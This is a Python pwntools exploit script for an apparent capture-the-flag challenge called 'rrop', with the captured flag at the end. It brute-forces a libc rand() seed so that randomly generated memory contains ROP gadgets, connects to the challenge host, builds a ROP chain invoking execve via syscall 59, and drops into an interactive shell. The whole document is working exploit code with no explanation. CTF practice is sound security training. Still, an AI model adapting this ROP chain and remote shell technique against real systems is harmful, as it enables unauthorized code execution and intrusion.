from pwn import *
from ctypes import *
import os
context.update(arch='amd64')

def contains(value, search, value2 = None):
    if value2 is not None:
        for random in search:
            if value in random or value2 in random:
                return True
        return False
    else:
        for random in search:
            if value in random:
                return True
        return False


pop_rax = asm('pop rax; ret')
syscall = asm("syscall")
pop_rdi = asm("pop rdi; ret")
pop_rsi = asm("pop rsi; ret")
pop_rdx = asm("pop rdx; ret")

#0x2862
def find_seed():
    base = 0x0
    _max = 0x10000
    found = 0
    for seed in range(base, base + _max):
        if seed % 0x200 == 0:
            print "Testing {}".format(hex(seed))
        libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
        libc.srand(seed)
        gadgets = []
        for i in range(8191+1):
            gadgets.append(p32(libc.rand()))
        if contains(pop_rax, gadgets):
            found += 1
        if contains(pop_rdx, gadgets):
            found += 1
        if contains(pop_rdi, gadgets):
            found += 1
        if contains(pop_rsi, gadgets):
            found += 1
        if contains(syscall, gadgets):
            found += 1
        if found == 5:
            print "FOUND: {}".format(hex(seed))
            return

        found = 0

def get_offset(value, addr, seed):
    gadgets = []
    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    libc.srand(seed)
    gadgets = []
    for i in range(8191+1):
        gadgets.append(p32(libc.rand()))

    for idx in range(0, len(gadgets)):
        offset = gadgets[idx].find(value)
        if offset != -1:
            return addr + idx*4 + offset
    return []



def exploit():
    seed = 0x31b

    io = remote("rrop-01.pwn.beer", 45243)
    io.recvuntil("seed: ")
    io.sendline(str(seed))
    io.recvuntil("addr: ")
    out = io.recvuntil("rrop: ")
    addr = int(out[2:-7], 16)

    pop_rax_addr = get_offset(pop_rax, addr, seed)
    pop_rdx_addr = get_offset(pop_rdx, addr, seed)
    pop_rsi_addr = get_offset(pop_rsi, addr, seed)
    pop_rdi_addr = get_offset(pop_rdi, addr, seed)
    syscall_addr = get_offset(syscall, addr, seed)

    log.info("pop rax   @ {}".format(hex(pop_rax_addr)))
    log.info("pop rdx   @ {}".format(hex(pop_rdx_addr)))
    log.info("pop rsi   @ {}".format(hex(pop_rsi_addr)))
    log.info("pop rdi   @ {}".format(hex(pop_rdi_addr)))
    log.info("syscall   @ {}".format(hex(syscall_addr)))

    binsh = -0x60c000 + 0x190000+0x1000*35+3739 -1

    payload  = p64(pop_rax_addr)
    payload += p64(59)
    payload += p64(pop_rdi_addr)
    payload += p64(addr + binsh)
    payload += p64(syscall_addr)

    io.sendline(payload)
    io.interactive()
    io.close()
exploit()
#SECT{cRe4tiv1tY_iS_intr0duc1nG_0rDEr_fr0M_RAnd0mN3sS}

